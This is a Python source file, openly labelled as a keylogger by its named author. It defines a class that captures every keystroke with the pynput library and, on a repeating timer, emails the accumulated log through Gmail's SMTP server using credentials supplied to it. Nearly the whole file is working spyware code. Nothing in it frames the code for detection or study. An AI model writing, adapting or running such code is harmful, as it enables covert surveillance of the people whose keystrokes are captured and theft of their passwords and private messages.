#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 06-07-2020
# Last Updated: 28-08-2020
# Operating System: Linux, Mac, and Windows
# Description: A class that records the key strokes of a system and sends those details to an e-mail id.

# Import the necessary libraries
from threading import Timer
import pynput.keyboard, threading, smtplib


# Define a class that uses the following functions as methods
class KeyLogger:
	# Define a constructor that creates an attribute "log" that can be used within the class
	def __init__(self, time_interval, email_id, passwd):
		self.log = "Keylogger Started"
		self.interval = time_interval
		self.email_id = email_id
		self.passwd = passwd


	# Define a function that appends the key strokes to a string
	def append_to_string(self, string):
		self.log = self.log + string


	# Define a call back function that processes the key strokes
	def key_press_process(self, key):
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key =  " "
			else:
				current_key = " " + str(key) + " "
		self.append_to_string(current_key)


	# Define a function that reports the log to and e-mail
	def report(self):
		# Send the log file ie., the keystrokes to a mentioned email_id
		self.send_mail(self.email_id, self.passwd, "\n\n" + self.log)
		# Reset the log variable
		self.log = ""
		# The report needs to execute alongside the key_press_process
		timer = threading.Timer(self.interval, self.report)
		timer.start()


	# Define a function that sends an email
	def send_mail(self, email_id, passwd, msg):
		# Create an instance of the SMTP server (here, a gmail SMTP server is created)
		server = smtplib.SMTP("smtp-mail.gmail.com", 587)
		# Initiate a TLS connection using the created server
		server.starttls()
		# Login to your gmail address
		server.login(email_id, passwd)
		# Send the mail (sender_id, receiver_id, message)
		server.sendmail(email_id, email_id, msg)
		# Quit the server
		server.quit()


	# Define a function that starts key logging
	def start(self):
		# Create a keyboard listener instance (object) (go through the documentation of pynput)
		keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press_process)
		# Interact with the keyboard_listener
		with keyboard_listener:
			self.report()
			# Start the keyboard_listener
			keyboard_listener.join()